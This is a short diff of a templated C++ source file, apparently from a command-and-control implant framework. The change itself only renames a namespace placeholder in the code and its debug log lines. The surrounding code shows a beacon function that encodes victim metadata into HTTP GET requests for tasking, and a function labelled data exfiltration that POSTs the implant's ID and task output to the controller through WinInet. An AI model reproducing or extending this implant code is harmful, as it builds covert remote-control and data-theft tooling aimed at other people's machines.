@@ -15,7 +15,7 @@ Explanation: Data-driven C2 request generation using Token Replacement.
 
 using namespace std::string_literals;
 
-namespace [[ http_function_name ]] {
+namespace [[ http_profile_namespace ]] {
 
     // ====================================================================
     // Token Replacement Helpers
@@ -40,7 +40,7 @@ namespace [[ http_function_name ]] {
     // BEACON / TASKING (HTTP GET)
     // ====================================================================
     inline std::vector<uint8_t> get(std::vector<uint8_t> metadata_as_msgpack) {
-        DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] Initiating GET request");
+        DEBUG_LOG("[WinInet::[[ http_profile_namespace ]]::get] Initiating GET request");
 
         // 1. Prepare and Transform Metadata
         std::string metadata(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
@@ -94,7 +94,7 @@ namespace [[ http_function_name ]] {
         std::string request_body = "[[ get_config.client.body | default('') ]]";
         replace_token(request_body, "<METADATA>", metadata);
 
-        DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] Final URI: " + std::string(uri.begin(), uri.end()));
+        DEBUG_LOG("[WinInet::[[ http_profile_namespace ]]::get] Final URI: " + std::string(uri.begin(), uri.end()));
 
         // 5. Execute HTTP Request
         std::string http_response_buffer;
@@ -118,7 +118,7 @@ namespace [[ http_function_name ]] {
     // DATA EXFILTRATION (HTTP POST)
     // ====================================================================
     inline int post(std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list) {
-        DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Initiating POST");
+        DEBUG_LOG("[WinInet::[[ http_profile_namespace ]]::post] Initiating POST");
 
         // 1. Prepare and Transform ID & Payload
         std::string payload(task_response_msgpack_list.begin(), task_response_msgpack_list.end());
@@ -182,7 +182,7 @@ namespace [[ http_function_name ]] {
         replace_token(request_body, "<CLIENT_ID>", implant_uuid);
         replace_token(request_body, "<OUTPUT>", payload);
 
-        DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Final POST URI: " + std::string(uri.begin(), uri.end()));
+        DEBUG_LOG("[WinInet::[[ http_profile_namespace ]]::post] Final POST URI: " + std::string(uri.begin(), uri.end()));
 
         // 5. Execute HTTP Request
         std::string response_buffer;
